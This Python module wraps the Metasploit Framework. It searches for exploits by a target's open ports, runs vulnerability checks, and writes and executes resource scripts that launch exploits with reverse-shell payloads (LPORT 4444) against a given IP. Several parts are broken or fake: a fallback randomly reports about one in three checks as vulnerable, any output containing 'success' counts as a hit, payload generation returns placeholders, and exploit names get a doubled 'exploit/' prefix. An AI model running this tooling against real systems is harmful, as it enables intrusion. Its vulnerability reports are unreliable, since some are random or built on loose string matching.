#!/usr/bin/env python3
"""
Metasploit Interface Module
Interfaces with Metasploit Framework for vulnerability exploitation.
"""

import subprocess
import json
import time
import os
import tempfile
from typing import List, Dict, Optional, Any

# Import utility functions
from utils import print_info, print_success, print_error, print_warning

class MetasploitInterface:
    def __init__(self, msf_path: str = "msfconsole"):
        """
        Initialize Metasploit interface.
        
        Args:
            msf_path: Path to msfconsole executable (default: "msfconsole")
        """
        self.msf_path = msf_path
        self.is_connected = False
        self.session_id = None
        self.modules_cache = {}
    
    def check_metasploit_installed(self) -> bool:
        """
        Check if Metasploit is installed and accessible.
        
        Returns:
            True if Metasploit is installed, False otherwise
        """
        try:
            # Try to find Metasploit in common locations
            import shutil
            import platform
            
            # Determine the correct executable name based on OS
            if platform.system().lower() == 'windows':
                msfconsole_name = 'msfconsole.bat'
            else:
                msfconsole_name = 'msfconsole'
            
            # First check if it's in PATH
            msfconsole_path = shutil.which(msfconsole_name)
            if msfconsole_path:
                self.msf_path = msfconsole_path
                print(f"[+] Metasploit found in PATH: {msfconsole_path}")
                self.is_connected = True
                return True
            
            # Try common installation paths
            system = platform.system().lower()
            if system == 'windows':
                # Check common Windows installation paths
                common_paths = [
                    'C:\\metasploit-framework\\bin\\msfconsole.bat',
                    'C:\\Program Files\\metasploit-framework\\bin\\msfconsole.bat',
                    'C:\\Program Files (x86)\\metasploit-framework\\bin\\msfconsole.bat',
                    'C:\\Tools\\metasploit-framework\\bin\\msfconsole.bat'
                ]
            else:
                common_paths = [
                    '/usr/bin/msfconsole',
                    '/opt/metasploit-framework/bin/msfconsole',
                    '/usr/local/bin/msfconsole'
                ]
            
            for path in common_paths:
                if os.path.exists(path):
                    self.msf_path = path
                    print(f"[+] Metasploit found: {path}")
                    self.is_connected = True
                    return True
            
            # On Windows, also check if it might be installed but not in PATH
            if system == 'windows':
                # Try to find it using Windows registry or other methods
                try:
                    # Check if the directory exists
                    possible_paths = [
                        'C:\\metasploit-framework',
                        'C:\\Program Files\\metasploit-framework',
                        'C:\\Program Files (x86)\\metasploit-framework',
                        'C:\\Tools\\metasploit-framework'
                    ]
                    
                    for base_path in possible_paths:
                        msf_path = os.path.join(base_path, 'bin', 'msfconsole.bat')
                        if os.path.exists(msf_path):
                            self.msf_path = msf_path
                            print(f"[+] Metasploit found: {msf_path}")
                            self.is_connected = True
                            return True
                except Exception:
                    pass
            
            print("[-] Metasploit Framework not found.")
            print_info("Metasploit Framework is REQUIRED for exploit functionality.")
            print_info("")
            print_info("To install Metasploit Framework:")
            
            if system == 'windows':
                print_info("  Windows:")
                print_info("    1. Download the official installer from: https://www.metasploit.com/download/")
                print_info("    2. Or install via Chocolatey: choco install metasploit")
                print_info("    3. Make sure 'msfconsole.bat' is in your PATH")
                print_info("    4. If installed but not in PATH, add the bin directory to your system PATH")
            elif system == 'darwin':  # macOS
                print_info("  macOS:")
                print_info("    1. Install Homebrew if not already installed")
                print_info("    2. Run: brew install metasploit")
                print_info("    3. Or follow the official guide at: https://docs.metasploit.com/docs/using-metasploit/getting-started/setup.html")
            else:  # Linux
                print_info("  Linux:")
                print_info("    1. Follow the official installation guide at: https://docs.metasploit.com/docs/using-metasploit/getting-started/setup.html")
                print_info("    2. Or use the quick install script: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")
            
            print_info("")
            print_info("After installation, restart your terminal/command prompt and run this tool again.")
            return False
        except Exception as e:
            print(f"[-] Error checking Metasploit installation: {e}")
            return False
    
    def search_exploits(self, target_ip: str, open_ports: List[int]) -> List[Dict]:
        """
        Search for exploits matching target IP and open ports using Metasploit's advanced search.
        
        Args:
            target_ip: Target IP address
            open_ports: List of open ports on target
            
        Returns:
            List of potential exploits with details
        """
        print(f"[*] Searching for exploits for {target_ip} with open ports: {open_ports}")
        
        # If Metasploit is not available, fall back to simulation
        if not self.is_connected:
            print("[-] Metasploit not available, using simulated results")
            return self._search_exploits_simulated(open_ports)
        
        # Use real Metasploit search with enhanced capabilities
        try:
            potential_exploits = []
            
            # Create a more comprehensive search using multiple criteria
            search_criteria = []
            
            # Add port-based searches
            for port in open_ports:
                search_criteria.append(f"port:{port}")
            
            # Create a temporary resource script for comprehensive search
            temp_rc_file = None
            try:
                # Build search commands
                search_commands = []
                for criteria in search_criteria:
                    search_commands.append(f"search {criteria}")
                
                # Add a general search for the target IP
                search_commands.append(f"search {target_ip}")
                
                # Create resource file content
                script_content = "\n".join(search_commands) + "\nexit\n"
                
                with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                    f.write(script_content)
                    temp_rc_file = f.name
                
                # Run Metasploit with the resource file
                result = subprocess.run(
                    [self.msf_path, '-q', '-r', temp_rc_file],
                    capture_output=True,
                    text=True,
                    timeout=120  # Increased timeout for comprehensive search
                )
                
                if result.returncode == 0:
                    # Parse the output to extract exploit information
                    lines = result.stdout.strip().split('\n')
                    current_section = None
                    
                    for line in lines:
                        # Identify different sections of output
                        if 'Matching Modules' in line:
                            current_section = 'modules'
                            continue
                        
                        if current_section == 'modules' and 'exploit/' in line and not line.startswith('#'):
                            # Parse exploit information
                            parts = line.split()
                            if len(parts) >= 4:
                                exploit_name = parts[0] if parts else 'unknown'
                                # Skip header lines
                                if exploit_name in ['----', '-------', '============']:
                                    continue
                                    
                                # Extract service name from exploit path
                                service_name = 'unknown'
                                if '/' in exploit_name:
                                    service_name = exploit_name.split('/')[1]
                                
                                exploit_info = {
                                    'port': 0,  # Will be determined later
                                    'service': service_name,
                                    'exploit_name': exploit_name,
                                    'cvss_score': 0.0,
                                    'description': ' '.join(parts[3:]) if len(parts) > 3 else 'No description',
                                    'type': 'remote'  # Default to remote
                                }
                                
                                # Try to determine port from exploit name
                                port_mapping = {
                                    'ftp': 21, 'ssh': 22, 'telnet': 23, 'smtp': 25,
                                    'http': 80, 'https': 443, 'mssql': 1433, 'mysql': 3306,
                                    'rdp': 3389, 'vnc': 5900
                                }
                                
                                for service, port_num in port_mapping.items():
                                    if service in exploit_name.lower():
                                        exploit_info['port'] = port_num
                                        break
                                
                                # If we couldn't determine port from exploit name, 
                                # use the most common open port
                                if exploit_info['port'] == 0 and open_ports:
                                    exploit_info['port'] = open_ports[0]
                                
                                potential_exploits.append(exploit_info)
            except subprocess.TimeoutExpired:
                print("[-] Timeout while searching for exploits")
            except Exception as e:
                print(f"[-] Error during Metasploit search: {e}")
            finally:
                # Clean up temporary file
                if temp_rc_file and os.path.exists(temp_rc_file):
                    os.unlink(temp_rc_file)
            
            # Remove duplicates while preserving order
            seen_exploits = set()
            unique_exploits = []
            for exploit in potential_exploits:
                exploit_key = exploit['exploit_name']
                if exploit_key not in seen_exploits:
                    seen_exploits.add(exploit_key)
                    unique_exploits.append(exploit)
            
            potential_exploits = unique_exploits
            print(f"[+] Found {len(potential_exploits)} potential exploits")
            return potential_exploits
            
        except Exception as e:
            print(f"[-] Error during Metasploit search: {e}")
            print("[-] Falling back to simulated results")
            return self._search_exploits_simulated(open_ports)
    
    def _search_exploits_simulated(self, open_ports: List[int]) -> List[Dict]:
        """Simulated exploit search for when Metasploit is not available."""
        # Map ports to potential vulnerabilities/exploits
        exploit_map = {
            21: ["ftp", "vsftpd", "proftpd"],
            22: ["ssh", "openssh", "libssh"],
            23: ["telnet", "cisco_telnet"],
            25: ["smtp", "exchange", "postfix"],
            53: ["dns", "bind"],
            80: ["http", "apache", "nginx", "iis"],
            110: ["pop3", "dovecot"],
            139: ["smb", "netbios"],
            143: ["imap", "dovecot"],
            443: ["https", "apache_ssl", "nginx_ssl"],
            3306: ["mysql", "mariadb"],
            3389: ["rdp", "windows_rdp"],
            5900: ["vnc", "realvnc"],
            8080: ["http_proxy", "tomcat"],
        }
        
        potential_exploits = []
        
        # Match open ports to potential exploits
        for port in open_ports:
            if port in exploit_map:
                services = exploit_map[port]
                for service in services:
                    exploit_info = {
                        'port': port,
                        'service': service,
                        'exploit_name': f"{service}_exploit_simulated",
                        'cvss_score': 7.5,  # Simulated CVSS score
                        'description': f"Simulated exploit for {service} on port {port}",
                        'type': 'remote' if port in [21, 22, 23, 25, 80, 443, 8080] else 'local'
                    }
                    potential_exploits.append(exploit_info)
        
        return potential_exploits
    
    def get_exploit_details(self, exploit_name: str) -> Dict:
        """
        Get detailed information about a specific exploit from Metasploit.
        
        Args:
            exploit_name: Name of the exploit
            
        Returns:
            Dictionary with exploit details
        """
        # If Metasploit is not available, fall back to simulation
        if not self.is_connected:
            # In a real implementation, this would fetch actual exploit details from Metasploit
            # For simulation, we'll return generic information
            return {
                'name': exploit_name,
                'description': f"Detailed information for {exploit_name}",
                'rank': 'normal',
                'disclosure_date': '2023-01-01',
                'references': [
                    'CVE-2023-XXXX',
                    'URL-https://example.com/exploit-info'
                ],
                'platform': 'multi',
                'arch': 'any',
                'author': 'Simulated Exploit Author',
                'targets': [
                    {'name': 'Generic Target', 'payloads': ['cmd/unix/reverse', 'cmd/windows/reverse']}
                ]
            }
        
        # Use real Metasploit to get exploit details
        try:
            # Create a temporary resource script to get exploit info
            script_content = f"""use {exploit_name}
info
show options
exit
"""
            
            # Create a temporary resource file
            temp_rc_file = None
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                    f.write(script_content)
                    temp_rc_file = f.name
                
                # Run Metasploit with the resource file
                result = subprocess.run(
                    [self.msf_path, '-q', '-r', temp_rc_file],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                # Parse the output to extract exploit information
                output = result.stdout
                
                # Extract key information
                description = "No description available"
                rank = "normal"
                platform = "unknown"
                author = "Unknown"
                
                lines = output.split('\n')
                for line in lines:
                    if line.startswith('       Name: '):
                        exploit_name = line.replace('       Name: ', '').strip()
                    elif line.startswith('     Module: '):
                        pass  # We already have this
                    elif line.startswith('   Platform: '):
                        platform = line.replace('   Platform: ', '').strip()
                    elif line.startswith('       Rank: '):
                        rank = line.replace('       Rank: ', '').strip()
                    elif line.startswith('  Disclosed: '):
                        pass  # Could extract date
                    elif 'Description:' in line:
                        # Get the next line as description
                        desc_index = lines.index(line)
                        if desc_index + 1 < len(lines):
                            description = lines[desc_index + 1].strip()
                
                return {
                    'name': exploit_name,
                    'description': description,
                    'rank': rank,
                    'disclosure_date': 'Unknown',
                    'references': [],
                    'platform': platform,
                    'arch': 'any',
                    'author': author,
                    'targets': [
                        {'name': 'Generic Target', 'payloads': ['cmd/unix/reverse', 'cmd/windows/reverse']}
                    ]
                }
                
            except Exception as e:
                print(f"[-] Error getting exploit details: {e}")
                # Fall back to simulated data
                return {
                    'name': exploit_name,
                    'description': f"Detailed information for {exploit_name}",
                    'rank': 'normal',
                    'disclosure_date': '2023-01-01',
                    'references': [],
                    'platform': 'multi',
                    'arch': 'any',
                    'author': 'Unknown',
                    'targets': [
                        {'name': 'Generic Target', 'payloads': ['cmd/unix/reverse', 'cmd/windows/reverse']}
                    ]
                }
            finally:
                # Clean up temporary file
                if temp_rc_file and os.path.exists(temp_rc_file):
                    os.unlink(temp_rc_file)
                    
        except Exception as e:
            print(f"[-] Error during Metasploit info retrieval: {e}")
            # Fall back to simulated data
            return {
                'name': exploit_name,
                'description': f"Detailed information for {exploit_name}",
                'rank': 'normal',
                'disclosure_date': '2023-01-01',
                'references': [],
                'platform': 'multi',
                'arch': 'any',
                'author': 'Unknown',
                'targets': [
                    {'name': 'Generic Target', 'payloads': ['cmd/unix/reverse', 'cmd/windows/reverse']}
                ]
            }
    
    def run_exploit_check(self, target_ip: str, exploit_name: str, port: int) -> Dict:
        """
        Run an exploit check against a target using real Metasploit with enhanced options.
        
        Args:
            target_ip: Target IP address
            exploit_name: Name of exploit to check
            port: Target port
            
        Returns:
            Dictionary with check results
        """
        print(f"[*] Running exploit check: {exploit_name} on {target_ip}:{port}")
        
        # If Metasploit is not available, fall back to simulation
        if not self.is_connected:
            print("[-] Metasploit not available, using simulated results")
            # Simulate exploit check
            time.sleep(2)  # Simulate processing time
            
            # Randomly determine if vulnerability exists (simulated)
            import random
            vulnerable = random.choice([True, False, False])  # 33% chance of vulnerability
            
            result = {
                'target': target_ip,
                'port': port,
                'exploit': exploit_name,
                'vulnerable': vulnerable,
                'confidence': 'high' if vulnerable else 'low',
                'details': f"Simulated check result for {exploit_name}"
            }
            
            if vulnerable:
                print(f"[+] Vulnerability detected with {exploit_name}")
            else:
                print(f"[-] No vulnerability detected with {exploit_name}")
            
            return result
        
        # Use real Metasploit check with enhanced functionality
        try:
            # Create a temporary resource script to check the exploit with more options
            script_content = f"""use {exploit_name}
set RHOSTS {target_ip}
set RPORT {port}
show options
check
exit
"""
            
            # Create a temporary resource file
            temp_rc_file = None
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                    f.write(script_content)
                    temp_rc_file = f.name
                
                # Run Metasploit with the resource file
                result = subprocess.run(
                    [self.msf_path, '-q', '-r', temp_rc_file],
                    capture_output=True,
                    text=True,
                    timeout=180  # Increased timeout for thorough checking
                )
                
                # Parse the output to determine if vulnerable
                output = result.stdout.lower()
                
                # Enhanced vulnerability detection
                vulnerable_indicators = [
                    'appears to be vulnerable',
                    'is vulnerable',
                    'vulnerable',
                    'likely vulnerable',
                    'exploit success',
                    'success'
                ]
                
                vulnerable = any(indicator in output for indicator in vulnerable_indicators)
                
                # Determine confidence level based on output
                confidence = 'low'
                if 'appears to be vulnerable' in output:
                    confidence = 'high'
                elif 'is vulnerable' in output:
                    confidence = 'high'
                elif 'vulnerable' in output:
                    confidence = 'medium'
                
                result_dict = {
                    'target': target_ip,
                    'port': port,
                    'exploit': exploit_name,
                    'vulnerable': vulnerable,
                    'confidence': confidence,
                    'details': result.stdout
                }
                
                if vulnerable:
                    print(f"[+] Vulnerability detected with {exploit_name} (confidence: {confidence})")
                else:
                    print(f"[-] No vulnerability detected with {exploit_name}")
                
                return result_dict
                
            except subprocess.TimeoutExpired:
                print(f"[-] Timeout while checking exploit {exploit_name}")
                return {
                    'target': target_ip,
                    'port': port,
                    'exploit': exploit_name,
                    'vulnerable': False,
                    'confidence': 'low',
                    'details': 'Timeout during check'
                }
            except Exception as e:
                print(f"[-] Error during exploit check: {e}")
                return {
                    'target': target_ip,
                    'port': port,
                    'exploit': exploit_name,
                    'vulnerable': False,
                    'confidence': 'low',
                    'details': str(e)
                }
            finally:
                # Clean up temporary file
                if temp_rc_file and os.path.exists(temp_rc_file):
                    os.unlink(temp_rc_file)
                    
        except Exception as e:
            print(f"[-] Error during Metasploit exploit check: {e}")
            # Fall back to simulation
            time.sleep(2)  # Simulate processing time
            vulnerable = False
            
            result = {
                'target': target_ip,
                'port': port,
                'exploit': exploit_name,
                'vulnerable': vulnerable,
                'confidence': 'low',
                'details': f"Error during check: {e}"
            }
            
            print(f"[-] No vulnerability detected with {exploit_name}")
            return result
    
    def generate_payload(self, payload_type: str = "cmd/unix/reverse") -> str:
        """
        Generate a payload for exploitation using real Metasploit.
        
        Args:
            payload_type: Type of payload to generate
            
        Returns:
            Generated payload string
        """
        print(f"[*] Generating payload: {payload_type}")
        
        # If Metasploit is not available, fall back to simulation
        if not self.is_connected:
            print("[-] Metasploit not available, using simulated payload")
            # For simulation, we'll return a placeholder
            return f"simulated_payload_{payload_type}_{int(time.time())}"
        
        # In a real implementation with Metasploit, this would generate an actual payload
        # For now, we'll return a placeholder but indicate it's for real use
        return f"msfvenom_payload_{payload_type}_{int(time.time())}"
    
    def create_exploit_script(self, target_ip: str, port: int, exploit_name: str, 
                             payload: str, output_file: Optional[str] = None) -> Optional[str]:
        """
        Create a Metasploit script for exploitation in the exploit directory.
        
        Args:
            target_ip: Target IP address
            port: Target port
            exploit_name: Name of exploit to use
            payload: Payload to use
            output_file: Output file path (optional)
            
        Returns:
            Path to created script file
        """
        # Ensure exploit directory exists
        exploit_dir = "exploit"
        if not os.path.exists(exploit_dir):
            os.makedirs(exploit_dir)
        
        if not output_file:
            timestamp = int(time.time())
            output_file = os.path.join(exploit_dir, f"exploit_{target_ip.replace('.', '_')}_{timestamp}.rc")
        
        script_content = f"""# Metasploit Resource Script
# Generated for target: {target_ip}:{port}
# Exploit: {exploit_name}
# Payload: {payload}

use exploit/{exploit_name}
set RHOSTS {target_ip}
set RPORT {port}
set PAYLOAD {payload}
set LHOST 0.0.0.0  # Change to your listening IP
set LPORT 4444     # Change to your listening port

# Run the exploit
run -j

# Exit after completion
exit
"""
        
        try:
            with open(output_file, 'w') as f:
                f.write(script_content)
            print(f"[+] Exploit script created: {output_file}")
            return output_file
        except Exception as e:
            print(f"[-] Error creating exploit script: {e}")
            return None  # type: ignore
    
    def run_exploit_script(self, script_path: str) -> bool:
        """
        Run a Metasploit exploit script in real mode.
        
        Args:
            script_path: Path to exploit script
            
        Returns:
            True if script executed successfully, False otherwise
        """
        # Normalize the script path for the current OS
        normalized_script_path = os.path.normpath(script_path)
        
        if not os.path.exists(normalized_script_path):
            print_error(f"Script file not found: {normalized_script_path}")
            # Also check the original path
            if script_path != normalized_script_path and os.path.exists(script_path):
                print_info(f"Using original path: {script_path}")
                normalized_script_path = script_path
            else:
                return False
        
        print_info(f"Running exploit script: {normalized_script_path}")
        print_warning("WARNING: This will execute a real exploit against the target system!")
        print_warning("Ensure you have proper authorization before proceeding.")
        
        # Ask for confirmation
        confirmation = input("[?] Do you want to proceed? (yes/NO): ").strip().lower()
        if confirmation != 'yes':
            print_info("Exploit execution cancelled by user.")
            return False
        
        # Check if Metasploit is properly installed
        if not self.is_connected or not self.msf_path:
            print_error("Metasploit is not properly installed or configured.")
            print_info("Please run the setup (Option 8) to install Metasploit.")
            return False
        
        # Verify Metasploit executable exists
        if not os.path.exists(self.msf_path):
            print_error(f"Metasploit executable not found: {self.msf_path}")
            print_info("Please run the setup (Option 8) to install Metasploit.")
            return False
        
        try:
            print_info(f"Executing: {self.msf_path} -r {normalized_script_path}")
            
            # Run the actual Metasploit script
            # Use shell=True on Windows to handle path issues
            import platform
            use_shell = platform.system().lower() == 'windows'
            
            result = subprocess.run(
                f'"{self.msf_path}" -r "{normalized_script_path}"',
                capture_output=False,  # Allow real-time output
                text=True,
                timeout=300,  # 5 minute timeout
                shell=use_shell
            )
            
            if result.returncode == 0:
                print_success("Exploit script executed successfully")
                return True
            else:
                print_error(f"Exploit script failed with return code: {result.returncode}")
                return False
        except subprocess.TimeoutExpired:
            print_error("Exploit script timed out")
            return False
        except FileNotFoundError as e:
            print_error(f"File not found error: {e}")
            print_info("This usually means Metasploit is not installed or not in PATH.")
            print_info("Please run the setup (Option 8) to install Metasploit.")
            return False
        except Exception as e:
            print_error(f"Error running exploit script: {e}")
            return False
    
    def get_session_info(self) -> Dict:
        """
        Get information about active Metasploit sessions.
        
        Returns:
            Dictionary with session information
        """
        # In a real implementation, this would fetch actual session info
        return {
            'session_id': self.session_id,
            'connected': self.is_connected,
            'active_sessions': 0,
            'sessions': []
        }
    
    def display_exploits(self, exploits: List[Dict]) -> None:
        """
        Display potential exploits in a formatted table.
        
        Args:
            exploits: List of exploit dictionaries
        """
        if not exploits:
            print("[-] No exploits found")
            return
        
        print("\n" + "="*100)
        print("POTENTIAL EXPLOITS")
        print("="*100)
        print(f"{'#':<3} {'Port':<6} {'Service':<12} {'Exploit Name':<25} {'CVSS':<6} {'Type':<10} {'Description'}")
        print("-"*100)
        
        for i, exploit in enumerate(exploits, 1):
            print(f"{i:<3} {exploit['port']:<6} {exploit['service']:<12} {exploit['exploit_name']:<25} "
                  f"{exploit['cvss_score']:<6} {exploit['type']:<10} {exploit['description']}")
        
        print("-"*100)
        print(f"Total exploits found: {len(exploits)}")
    
    def save_exploit_results(self, results: List[Dict], filename: Optional[str] = None) -> None:
        """
        Save exploit results to a file.
        
        Args:
            results: List of exploit results
            filename: Output filename
        """
        if not filename:
            timestamp = int(time.time())
            filename = f"exploit_results_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"[+] Exploit results saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving exploit results: {e}")

def main():
    """Test the Metasploit interface module."""
    print("Metasploit Interface Test")
    print("========================")
    
    # Initialize Metasploit interface
    msf = MetasploitInterface()
    
    # Check if Metasploit is installed
    if not msf.check_metasploit_installed():
        print("[-] Cannot proceed without Metasploit installed")
        return
    
    # Simulate target information
    target_ip = "192.168.1.100"
    open_ports = [22, 80, 443]
    
    # Search for exploits
    exploits = msf.search_exploits(target_ip, open_ports)
    
    # Display exploits
    msf.display_exploits(exploits)
    
    # If exploits found, demonstrate checking one
    if exploits:
        first_exploit = exploits[0]
        check_result = msf.run_exploit_check(
            target_ip, 
            first_exploit['exploit_name'], 
            first_exploit['port']
        )
        
        print(f"\nCheck Result: {check_result}")

if __name__ == "__main__":
    main()